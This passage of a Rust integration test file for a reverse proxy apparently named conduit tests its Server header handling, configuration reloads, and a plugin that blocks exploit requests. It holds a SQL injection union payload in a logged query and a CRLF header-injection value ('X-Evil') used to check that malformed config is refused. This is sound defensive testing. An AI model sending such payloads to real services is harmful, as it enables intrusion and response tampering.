            "block_exploits: blocked sqli (sqli-union) in query: site shield, client 127.0.0.1, \
             GET shield.test/item?id=1+union+select+null,null--"
        ) && log.contains("block_exploits: detected sqli (sqli-union) in query: site watch"),
        "{log}"
    );
}

/// What `raw`, sent as is, gets back.
fn raw_request(port: u16, raw: &str) -> Resp {
    let mut s = TcpStream::connect(("127.0.0.1", port)).unwrap();
    s.set_read_timeout(Some(Duration::from_secs(10))).unwrap();
    s.write_all(raw.as_bytes()).unwrap();
    parse(&read_all(&mut s))
}

#[test]
fn server_header() {
    let dir = test_dir("server-header");
    let (upstream, _) = echo_upstream();
    let (http_port, admin, dead) = (free_port(), free_port(), free_port());
    let cfg_path = dir.join("conduit.yaml");
    let write = |defaults: &str| {
        std::fs::write(
            &cfg_path,
            format!(
                r#"
server:
  threads: 2
  shutdown_grace: 1s
  pid_file: {d}/conduit.pid
  upgrade_sock: {d}/upgrade.sock
listen:
  http: ["127.0.0.1:{http_port}"]
admin:
  listen: "127.0.0.1:{admin}"
defaults: {{ {defaults} }}
sites:
  - id: app
    hosts: [app.test]
    upstream: http://127.0.0.1:{upstream}
  - id: quiet
    hosts: [quiet.test]
    upstream: http://127.0.0.1:{upstream}
    plugins:
      - headers: {{ response: {{ remove: [server] }} }}
  - id: denied
    hosts: [denied.test]
    upstream: http://127.0.0.1:{upstream}
    plugins:
      - ip_filter: {{ deny: [127.0.0.0/8] }}
  - id: down
    hosts: [down.test]
    upstream: http://127.0.0.1:{dead}
"#,
                d = dir.display()
            ),
        )
        .unwrap()
    };
    write("");
    let proxy = Proxy {
        child: spawn(&cfg_path, &[], "conduit.log"),
        dir: dir.clone(),
    };
    wait_for_port(http_port);
    let get = |host: &str| http(http_port, host, "/", &[]);
    let malformed = || {
        raw_request(
            http_port,
            "GET / HTTP/1.1\r\nHost: app.test\r\nnot a header\r\n\r\n",
        )
    };
    let connect = || {
        raw_request(
            http_port,
            "CONNECT example.com:443 HTTP/1.1\r\nHost: example.com:443\r\n\r\n",
        )
    };

    // On by default: every response says `conduit`, the upstream's own included, without a
    // version.
    let r = get("app.test");
    assert_eq!((r.status, r.header("server")), (200, Some("conduit")));
    assert!(r.body.starts_with("get / http/1.1"), "{r:?}");
    for (r, status) in [
        (get("unknown.test"), 404),
        (get("denied.test"), 403),
        (get("down.test"), 502),
        (malformed(), 400),
        (connect(), 405),
    ] {
        assert_eq!((r.status, r.header("server")), (status, Some("conduit")));
        assert_eq!(
            r.headers
                .iter()
                .filter(|(k, _)| k.eq_ignore_ascii_case("server"))
                .count(),
            1
        );
    }
    // A site can still drop it.
    let r = get("quiet.test");
    assert_eq!((r.status, r.header("server")), (200, None));

    // Off after a reload: conduit's responses carry none, not even Pingora's name, and the
    // upstream's passes through.
    write("server_header: off");
    signal(proxy.child.id(), "-HUP");
    wait_until("the reload", Duration::from_secs(10), || {
        get("app.test").header("server") == Some("echo-upstream")
    });
    for (r, status) in [
        (get("unknown.test"), 404),
        (get("denied.test"), 403),
        (get("down.test"), 502),
        (malformed(), 400),
        (connect(), 405),
    ] {
        assert_eq!((r.status, r.header("server")), (status, None), "{r:?}");
    }
    assert_eq!(status_json(admin)["config"]["last_reload"]["ok"], true);

    // A value that is not a plain header value is refused; the running one stays.
    write("server_header: \"conduit\\r\\nX-Evil: 1\"");
    signal(proxy.child.id(), "-HUP");
    wait_until(
        "the failed reload is reported",
        Duration::from_secs(10),
        || status_json(admin)["config"]["last_reload"]["ok"] == false,
    );
    let r = get("app.test");
    assert_eq!(r.header("server"), Some("echo-upstream"));
    assert!(r.header("x-evil").is_none());
}
